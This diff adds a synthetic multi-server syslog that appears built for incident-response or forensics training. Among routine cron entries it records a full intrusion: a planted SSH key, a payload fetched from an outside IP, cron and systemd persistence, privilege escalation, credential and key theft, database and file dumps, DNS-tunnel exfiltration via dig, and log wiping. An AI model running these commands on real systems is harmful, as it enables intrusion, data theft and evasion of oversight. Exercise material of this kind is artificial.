@@ -1,0 +1,126 @@
+Nov 12 06:00:01 srv-web01 CRON[1050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 06:00:02 srv-app01 CRON[2050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 06:00:30 srv-web01 CRON[1055]: (root) CMD (/opt/scripts/health_check.sh)
+Nov 12 06:00:31 srv-app01 CRON[2055]: (root) CMD (/opt/scripts/api_health.sh)
+Nov 12 06:15:00 srv-db01 CRON[3050]: (postgres) CMD (/usr/local/bin/pg_backup.sh)
+Nov 12 06:30:00 srv-file01 CRON[4050]: (root) CMD (/opt/scripts/sync_shares.sh)
+Nov 12 07:00:01 srv-web01 CRON[1050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 07:00:02 srv-app01 CRON[2050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 07:02:30 srv-web01 CRON[1055]: (root) CMD (/opt/scripts/health_check.sh)
+Nov 12 07:02:31 srv-app01 CRON[2055]: (root) CMD (/opt/scripts/api_health.sh)
+Nov 12 07:25:00 srv-web01 bash[1180]: k.mensah: CMD: echo 'AUTHORIZED PENTEST: NetSec Consulting (91.189.88.161) window 07:30-16:00' >> /var/log/pentest-schedule.txt
+Nov 12 08:00:01 srv-web01 CRON[1050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 08:00:02 srv-app01 CRON[2050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 08:04:30 srv-web01 CRON[1055]: (root) CMD (/opt/scripts/health_check.sh)
+Nov 12 08:04:31 srv-app01 CRON[2055]: (root) CMD (/opt/scripts/api_health.sh)
+Nov 12 09:00:01 srv-web01 CRON[1050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 09:00:02 srv-app01 CRON[2050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 09:04:30 srv-web01 CRON[1055]: (root) CMD (/opt/scripts/health_check.sh)
+Nov 12 09:04:31 srv-app01 CRON[2055]: (root) CMD (/opt/scripts/api_health.sh)
+Nov 12 09:05:16 srv-web01 opendkim[890]: 9E5F6A: digitogo-updates.com no signing table match
+Nov 12 09:12:35 srv-web01 kernel[0]: [47555.000000] audit: type=1107 exe="/usr/bin/python3" terminal=pts/0 res=success comm="python3" addr=192.168.10.105
+Nov 12 09:15:00 srv-db01 CRON[3050]: (postgres) CMD (/usr/local/bin/pg_backup.sh)
+Nov 12 09:25:05 srv-web01 bash[5010]: www-data: CMD: mkdir -p /home/www-data/.ssh
+Nov 12 09:25:08 srv-web01 bash[5011]: www-data: CMD: echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@kali' >> /home/www-data/.ssh/authorized_keys
+Nov 12 09:25:12 srv-web01 bash[5012]: www-data: CMD: chmod 600 /home/www-data/.ssh/authorized_keys
+Nov 12 09:30:01 srv-web01 bash[5020]: www-data: CMD: wget -q http://185.220.101.42:8080/.svc-update -O /tmp/.svc-update
+Nov 12 09:30:03 srv-web01 kernel[0]: [48603.000000] audit: type=1107 exe="/usr/bin/wget" terminal=pts/1 res=success comm="wget" addr=185.220.101.42
+Nov 12 09:30:10 srv-web01 bash[5021]: www-data: CMD: chmod +x /tmp/.svc-update
+Nov 12 09:32:01 srv-web01 crontab[5030]: (www-data) REPLACE: */10 * * * * /tmp/.svc-update >/dev/null 2>&1
+Nov 12 09:35:05 srv-web01 bash[5040]: www-data: CMD: cp /tmp/.svc-update /usr/local/bin/.svc-monitor
+Nov 12 09:35:10 srv-web01 systemd[1]: Created symlink /etc/systemd/system/multi-user.target.wants/svc-monitor.service
+Nov 12 10:00:01 srv-web01 CRON[1050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 10:00:02 srv-app01 CRON[2050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 10:00:05 srv-web01 bash[5100]: www-data: CMD: id
+Nov 12 10:00:06 srv-web01 bash[5114]: www-data: CMD: nmap -sn 192.168.10.0/24
+Nov 12 10:00:09 srv-web01 bash[5101]: www-data: CMD: uname -a
+Nov 12 10:00:13 srv-web01 bash[5102]: www-data: CMD: cat /etc/os-release
+Nov 12 10:00:17 srv-web01 bash[5103]: www-data: CMD: ip addr show
+Nov 12 10:00:21 srv-web01 bash[5104]: www-data: CMD: ip route
+Nov 12 10:00:25 srv-web01 bash[5105]: www-data: CMD: cat /etc/hosts
+Nov 12 10:00:29 srv-web01 bash[5106]: www-data: CMD: cat /etc/resolv.conf
+Nov 12 10:00:33 srv-web01 bash[5107]: www-data: CMD: find / -perm -4000 -type f 2>/dev/null
+Nov 12 10:00:37 srv-web01 bash[5108]: www-data: CMD: ls -la /opt/scripts/
+Nov 12 10:00:41 srv-web01 bash[5109]: www-data: CMD: cat /opt/scripts/api_deploy.sh
+Nov 12 10:00:45 srv-web01 bash[5110]: www-data: CMD: ss -tlnp
+Nov 12 10:00:49 srv-web01 bash[5111]: www-data: CMD: ps aux
+Nov 12 10:00:53 srv-web01 bash[5112]: www-data: CMD: env
+Nov 12 10:00:57 srv-web01 bash[5113]: www-data: CMD: cat /var/www/app/.env
+Nov 12 10:05:30 srv-web01 CRON[1055]: (root) CMD (/opt/scripts/health_check.sh)
+Nov 12 10:05:31 srv-app01 CRON[2055]: (root) CMD (/opt/scripts/api_health.sh)
+Nov 12 10:15:01 srv-web01 bash[5200]: www-data: CMD: /usr/bin/find /tmp -name .svc-update -exec /bin/bash -p \;
+Nov 12 10:15:03 srv-web01 bash[5201]: www-data: CMD: id
+Nov 12 10:20:05 srv-web01 bash[5300]: root: CMD: cat /etc/shadow
+Nov 12 10:20:08 srv-web01 bash[5301]: root: CMD: cat /home/k.mensah/.ssh/id_ed25519
+Nov 12 10:20:11 srv-web01 bash[5302]: root: CMD: cat /home/k.mensah/.ssh/id_ed25519.pub
+Nov 12 10:20:14 srv-web01 bash[5303]: root: CMD: cat /var/www/app/.env
+Nov 12 10:20:17 srv-web01 bash[5304]: root: CMD: cat /opt/scripts/api_deploy.sh
+Nov 12 10:20:20 srv-web01 bash[5305]: root: CMD: grep -r password /etc/ 2>/dev/null | head -20
+Nov 12 10:20:23 srv-web01 bash[5306]: root: CMD: cat /var/www/app/config/database.yml
+Nov 12 10:30:00 srv-file01 CRON[4050]: (root) CMD (/opt/scripts/sync_shares.sh)
+Nov 12 10:40:05 srv-app01 bash[2400]: k.mensah: CMD: id
+Nov 12 10:40:08 srv-app01 bash[2401]: k.mensah: CMD: cat /opt/api/.env
+Nov 12 10:40:11 srv-app01 bash[2402]: k.mensah: CMD: cat /opt/api/config/database.yml
+Nov 12 10:40:14 srv-app01 bash[2403]: k.mensah: CMD: sudo -l
+Nov 12 10:40:17 srv-app01 bash[2404]: k.mensah: CMD: ss -tlnp
+Nov 12 10:40:20 srv-app01 bash[2405]: k.mensah: CMD: cat /etc/hosts
+Nov 12 10:50:02 srv-app01 python3[2451]: spawning shell via manage.py os.system()
+Nov 12 11:00:01 srv-web01 CRON[1050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 11:00:02 srv-app01 CRON[2050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 11:00:05 srv-app01 bash[2500]: root: CMD: PGPASSWORD='F1n4nc3_DB_2026!' psql -h srv-db01 -U api_admin -d digitogo_finance -c '\dt'
+Nov 12 11:00:30 srv-web01 CRON[1055]: (root) CMD (/opt/scripts/health_check.sh)
+Nov 12 11:00:31 srv-app01 CRON[2055]: (root) CMD (/opt/scripts/api_health.sh)
+Nov 12 11:15:01 srv-db01 bash[3400]: k.mensah: CMD: sudo -u postgres pg_dump digitogo_finance > /tmp/.fin_dump.sql
+Nov 12 11:15:30 srv-db01 bash[3401]: k.mensah: CMD: sudo -u postgres pg_dump digitogo_hr >> /tmp/.fin_dump.sql
+Nov 12 11:20:01 srv-db01 bash[3402]: k.mensah: CMD: tar czf /tmp/.fin_dump.tar.gz /tmp/.fin_dump.sql
+Nov 12 11:20:15 srv-db01 bash[3403]: k.mensah: CMD: scp /tmp/.fin_dump.tar.gz k.mensah@192.168.10.51:/tmp/.fin_dump.tar.gz
+Nov 12 12:00:01 srv-web01 CRON[1050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 12:00:02 srv-app01 CRON[2050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 12:01:30 srv-web01 CRON[1055]: (root) CMD (/opt/scripts/health_check.sh)
+Nov 12 12:01:31 srv-app01 CRON[2055]: (root) CMD (/opt/scripts/api_health.sh)
+Nov 12 12:15:00 srv-db01 CRON[3050]: (postgres) CMD (/usr/local/bin/pg_backup.sh)
+Nov 12 13:00:01 srv-web01 CRON[1050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 13:00:02 srv-app01 CRON[2050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 13:04:30 srv-web01 CRON[1055]: (root) CMD (/opt/scripts/health_check.sh)
+Nov 12 13:04:31 srv-app01 CRON[2055]: (root) CMD (/opt/scripts/api_health.sh)
+Nov 12 13:35:01 srv-file01 bash[4400]: k.mensah: CMD: find /srv/shares/finance -name '*.xlsx' -o -name '*.pdf' | head -50
+Nov 12 13:35:20 srv-file01 bash[4401]: k.mensah: CMD: tar czf /tmp/.shares.tar.gz /srv/shares/finance/contracts/ /srv/shares/finance/payroll/
+Nov 12 13:38:01 srv-file01 bash[4402]: k.mensah: CMD: scp /tmp/.shares.tar.gz k.mensah@192.168.10.51:/tmp/.shares.tar.gz
+Nov 12 13:45:01 srv-app01 bash[2600]: root: CMD: scp /tmp/.fin_dump.tar.gz root@192.168.10.50:/tmp/.staging/
+Nov 12 13:45:10 srv-app01 bash[2601]: root: CMD: scp /tmp/.shares.tar.gz root@192.168.10.50:/tmp/.staging/
+Nov 12 14:00:01 srv-web01 CRON[1050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 14:00:01 srv-web01 bash[6000]: root: CMD: cat /tmp/.staging/.fin_dump.tar.gz /tmp/.staging/.shares.tar.gz > /tmp/.exfil_all
+Nov 12 14:00:02 srv-app01 CRON[2050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 14:00:10 srv-web01 bash[6001]: root: CMD: cat /var/www/app/.env >> /tmp/.exfil_all
+Nov 12 14:04:30 srv-web01 CRON[1055]: (root) CMD (/opt/scripts/health_check.sh)
+Nov 12 14:04:31 srv-app01 CRON[2055]: (root) CMD (/opt/scripts/api_health.sh)
+Nov 12 14:10:01 srv-web01 bash[6010]: root: CMD: echo -e 'EXPORT_STATUS=completed\nBACKUP_DATE=2026-11-12\nVOLUME_ID=vol-0x8f3a2b' > /tmp/.decoy
+Nov 12 14:10:05 srv-web01 bash[6011]: root: CMD: cat /tmp/.decoy | base64 | xxd -p | fold -w40 | while read c; do dig $c.data-sync.telemetry-cdn.xyz TXT +short; done
+Nov 12 14:25:01 srv-web01 bash[6020]: root: CMD: cat /tmp/.exfil_all | base64 | rev | base64 | xxd -p | fold -w40 | while read c; do dig $c.cdn-metrics.analytics-corp.xyz TXT +short; sleep 1; done
+Nov 12 14:30:00 srv-file01 CRON[4050]: (root) CMD (/opt/scripts/sync_shares.sh)
+Nov 12 15:00:01 srv-web01 CRON[1050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 15:00:02 srv-app01 CRON[2050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 15:04:30 srv-web01 CRON[1055]: (root) CMD (/opt/scripts/health_check.sh)
+Nov 12 15:04:31 srv-app01 CRON[2055]: (root) CMD (/opt/scripts/api_health.sh)
+Nov 12 15:15:00 srv-db01 CRON[3050]: (postgres) CMD (/usr/local/bin/pg_backup.sh)
+Nov 12 15:15:01 srv-web01 bash[6100]: root: CMD: truncate -s 0 /var/log/nginx/access.log
+Nov 12 15:15:04 srv-web01 bash[6101]: root: CMD: truncate -s 0 /var/log/nginx/error.log
+Nov 12 15:15:07 srv-web01 bash[6102]: root: CMD: truncate -s 0 /var/log/auth.log
+Nov 12 15:15:10 srv-web01 bash[6103]: root: CMD: truncate -s 0 /var/log/syslog
+Nov 12 15:15:13 srv-web01 bash[6104]: root: CMD: history -c && history -w
+Nov 12 15:15:16 srv-web01 bash[6105]: root: CMD: rm -f /tmp/.staging/ /tmp/.exfil_all /tmp/.decoy /tmp/.svc-update
+Nov 12 15:15:19 srv-web01 bash[6106]: root: CMD: crontab -r -u www-data
+Nov 12 15:15:22 srv-web01 bash[6107]: root: CMD: rm -f /home/www-data/.ssh/authorized_keys
+Nov 12 15:15:25 srv-web01 bash[6108]: root: CMD: systemctl disable svc-monitor.service 2>/dev/null
+Nov 12 15:15:28 srv-web01 crontab[6110]: (www-data) DELETE (www-data)
+Nov 12 15:20:01 srv-app01 bash[7000]: root: CMD: truncate -s 0 /var/log/auth.log
+Nov 12 15:20:04 srv-app01 bash[7001]: root: CMD: history -c && history -w
+Nov 12 15:20:07 srv-app01 bash[7002]: root: CMD: rm -f /tmp/.fin_dump.tar.gz /tmp/.shares.tar.gz
+Nov 12 15:20:10 srv-db01 bash[7003]: k.mensah: CMD: rm -f /tmp/.fin_dump.sql /tmp/.fin_dump.tar.gz
+Nov 12 15:20:13 srv-db01 bash[7004]: k.mensah: CMD: history -c
+Nov 12 15:20:16 srv-file01 bash[7005]: k.mensah: CMD: rm -f /tmp/.shares.tar.gz
+Nov 12 15:20:19 srv-file01 bash[7006]: k.mensah: CMD: history -c
+Nov 12 16:00:01 srv-web01 CRON[1050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 16:00:02 srv-app01 CRON[2050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Nov 12 16:03:30 srv-web01 CRON[1055]: (root) CMD (/opt/scripts/health_check.sh)
+Nov 12 16:03:31 srv-app01 CRON[2055]: (root) CMD (/opt/scripts/api_health.sh)
